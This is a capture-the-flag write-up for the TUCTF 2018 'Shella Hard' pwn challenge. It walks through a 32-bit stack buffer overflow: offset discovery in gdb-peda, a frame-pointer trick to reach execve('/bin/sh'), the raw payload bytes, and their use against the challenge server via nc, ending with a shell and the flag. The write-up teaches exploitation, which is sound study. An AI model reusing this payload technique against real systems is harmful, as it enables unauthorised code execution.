#### TUCTF CTF 2018 - Shella Hard 476 - Pwn 

##### Challenge

Difficulty: mind-melting hard
This program is crap! Is there even anything here?

nc 3.16.169.157 12345

#### Summary

It is a pwn task with a classic buffer stack overflow. The binary has NX enabled, and the way to get a shell is via *execve*. In addition, we have the string */bin/sh* in the code.

#### Solution

```bash
shella-hard: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4bf12a273afc940e93699d77a19496b781e88246, not stripped
```



![](https://unam.re/static/files/Shella-main.png)



```assembly
[0x0804843b]> iI
arch     x86
baddr    0x8048000
binsz    6047
bintype  elf
bits     32
canary   false
class    ELF32
crypto   false
endian   little
havecode true
intrp    /lib/ld-linux.so.2
lang     c
linenum  true
lsyms    true
machine  Intel 80386
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
static   false
stripped false
subsys   linux
va       true
[0x0804843b]> afll
address    size  nbbs edges    cc cost  min bound range max bound  calls locals args xref frame name
========== ==== ===== ===== ===== ==== ========== ===== ========== ===== ====== ==== ==== ===== ====
0x080482cc   35     3     3     2   19 0x080482cc    35 0x080482ef     2    0      0    1    12 sym._init
0x08048300    6     1     0     1    3 0x08048300     6 0x08048306     0    0      0    1     0 sym.imp.read
0x08048310    6     1     0     1    3 0x08048310     6 0x08048316     0    0      0    1     0 sym.imp.__libc_start_main
0x08048320    6     1     0     1    3 0x08048320     6 0x08048326     0    0      0    1     0 sym.imp.execve
0x08048330    6     1     0     1    3 0x08048330     6 0x08048336     0    0      0    1     0 sub.__gmon_start_330
0x08048340   33     1     0     1   20 0x08048340    33 0x08048361     1    0      0    0    28 entry0
0x08048370    4     1     0     1    4 0x08048370     4 0x08048374     0    0      0    3     0 sym.__x86.get_pc_thunk.bx
0x08048380   43     4     5     3   22 0x08048380    43 0x080483ab     0    0      0    1    24 sym.deregister_tm_clones
0x080483b0   53     4     5     3   28 0x080483b0    53 0x080483e5     0    0      0    2    24 sym.register_tm_clones
0x080483f0   30     3     3     2   15 0x080483f0    30 0x0804840e     1    0      0    0     8 sym.__do_global_dtors_aux
0x08048410   40     4     6     4   24 0x08048410    43 0x0804843b     0    0      0    0    28 entry1.init
0x0804843b   29     1     0     1   18 0x0804843b    29 0x08048458     1    1      0    1    32 sym.main
0x08048458   26     1     0     1   16 0x08048458    26 0x08048472     1    0      0    0     4 sym.giveShell
0x08048480   93     4     5     3   50 0x08048480    93 0x080484dd     2    0      2    1    28 sym.__libc_csu_init
0x080484e0    2     1     0     1    3 0x080484e0     2 0x080484e2     0    0      0    1     0 sym.__libc_csu_fini
0x080484e4   20     1     0     1   12 0x080484e4    20 0x080484f8     1    0      0    0    12 sym._fini
[0x0804843b]> iz
000 0x00000500 0x08048500   7   8 (.rodata) ascii /bin/sh

```



As every stack buffer overflow challenges, we will find the offset.

```assembly
gdb-peda$ pattern create 100 input
Writing pattern of 100 chars to filename "input"
gdb-peda$ r < input 
Starting program: /home/hiro/CTF/TUCTF_2018/pwn_shella/shella-hard < input

Program received signal SIGSEGV, Segmentation fault.

 [----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0xb7fbc000 --> 0x1a8da8 
ECX: 0xbffff398 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA\377\277L\364\377\277\232\316\376\267\001")
EDX: 0x1e 
ESI: 0x0 
EDI: 0x0 
EBP: 0x41434141 ('AACA')
ESP: 0xbffff3b0 ("(AADAA\377\277L\364\377\277\232\316\376\267\001")
EIP: 0x41412d41 ('A-AA')
EFLAGS: 0x10292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41412d41
[------------------------------------stack-------------------------------------]
0000| 0xbffff3b0 ("(AADAA\377\277L\364\377\277\232\316\376\267\001")
0004| 0xbffff3b4 --> 0xbfff4141 --> 0x0 
0008| 0xbffff3b8 --> 0xbffff44c --> 0xbffff5d2 ("XDG_VTNR=7")
0012| 0xbffff3bc --> 0xb7fece9a (<call_init+26>:	add    ebx,0x12166)
0016| 0xbffff3c0 --> 0x1 
0020| 0xbffff3c4 --> 0xbffff444 --> 0xbffff5a1 ("/home/hiro/CTF/TUCTF_2018/pwn_shella/shella-hard")
0024| 0xbffff3c8 --> 0xbffff3e4 --> 0xa008f5bd 
0028| 0xbffff3cc --> 0x804a010 --> 0xb7e2c970 (<__libc_start_main>:	push   ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41412d41 in ?? ()
gdb-peda$ patts
Registers contain pattern buffer:
EIP+0 found at offset: 20
EBP+0 found at offset: 16
Registers point to pattern buffer:
[ECX] --> offset 0 - size ~71
[ESP] --> offset 24 - size ~47
Pattern buffer found at:
0xbffff398 : offset    0 - size   30 ($sp + -0x18 [-6 dwords])
References to pattern buffer found at:
0xb7f6e085 : 0xbffff398 (/lib/i386-linux-gnu/i686/cmov/libc-2.19.so)
0xbffff37c : 0xbffff398 ($sp + -0x34 [-13 dwords])
0xbffff390 : 0xbffff398 ($sp + -0x20 [-8 dwords])
```



Alright, the EIP to overwrite is at offset 20. But the instruction *leave* will copy the frame pointer into the stack, so, there we have to write the address where we want to jump - 0x4 (execve - 0x4).  after this, we put the address of execve, a dummy and the address of /bin/sh with a *NULL* byte at the end.

```
"\x01\x00"+"A"*14+"\x63\x84\x04\x08"+"AAAA"+"\x00\x85\x04\x08"+"\x00"
```

The first 0x1 is because we need to set 0x1 into ECX register, in order to executes correctly *execve*. 



We launch against the server:

```bash
hiro@HackingLab:~/CTF/TUCTF_2018/pwn_shella$ python -c 'print "\x01\x00"+"A"*14+"\x63\x84\x04\x08"+"\x67\x84\x04\x08"+"\x00\x85\x04\x08"+"\x00"' > input
hiro@HackingLab:~/CTF/TUCTF_2018/pwn_shella$ (cat input ; cat) |  nc 3.16.169.157 12345
ls
chal
flag
id
uid=501(chal) gid=501(chal) groups=501(chal)
cat flag
TUCTF{175_wh475_1n51d3_7h47_c0un75}
```



Happy hacking! :)